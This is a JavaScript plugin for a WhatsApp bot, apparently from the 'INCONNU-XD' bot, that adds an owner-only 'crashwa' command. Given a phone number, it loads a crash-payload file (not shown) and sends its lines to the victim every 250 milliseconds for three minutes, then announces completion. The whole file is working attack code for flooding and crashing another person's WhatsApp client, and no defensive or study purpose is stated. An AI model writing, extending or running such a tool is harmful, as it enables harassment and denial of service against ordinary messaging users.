const { cmd } = require('../command');
const config = require('../config');
const bugchat = require('../bug/izuka6plus.js'); // Bon chemen ak non

cmd({
  pattern: 'crashwa',
  desc: 'Owner-only command to send WhatsApp crash payload to target',
  category: 'bug',
  react: '💣',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const botNumber = await bot.decodeJid(bot.user.id);
    const senderId = m.sender;
    const allowedUsers = [
      botNumber,
      config.OWNER_NUMBER + '@s.whatsapp.net',
      ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')
    ];
    const protectedNumbers = ['13058962443'];

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'crashwa') return;

    if (!allowedUsers.includes(senderId)) {
      return await bot.sendMessage(from, { text: '*🚫 This is an owner-only command.*' }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}crashwa <number>`
      }, { quoted: mek });
    }

    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected. Attack blocked.'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const crashLines = bugchat.split('\n').filter(Boolean);

    await bot.sendMessage(from, {
      text: `💣 *CRASHWA Attack Initiated*\n📱 Target: +${targetNumber}\n📦 Payload: ${crashLines.length} lines\n🕒 Duration: 3 minutes\n\n⚠️ Attack is in progress...`
    }, { quoted: mek });

    const startTime = Date.now();
    let totalSent = 0;

    while (Date.now() - startTime < 3 * 60 * 1000) { // 3 minutes
      for (let line of crashLines) {
        await bot.sendMessage(targetJid, {
          text: `💥 *CRASHWA PACKET #${++totalSent}*\n${line}\n\n💣 _INCONNU-XD CRASHWA ENGINE_`
        }).catch(err => console.error(`❌ Send failed:`, err));
        await new Promise(r => setTimeout(r, 250)); // 250ms delay
      }
    }

    await bot.sendMessage(targetJid, {
      text: `💀 *INCONNU CRASHWA COMPLETE*\n🧨 Sent: ${totalSent} crash payloads\n🕒 Duration: 3 minutes\n~INCONNU-XD~`
    });

    await bot.sendMessage(from, {
      text: `✅ *CRASHWA completed*\n📤 Sent: ${totalSent} messages\n🎯 Target: +${targetNumber}`
    }, { quoted: mek });

  } catch (error) {
    console.error(error);
    reply(`❌ Error: ${error.message}`);
  }
});
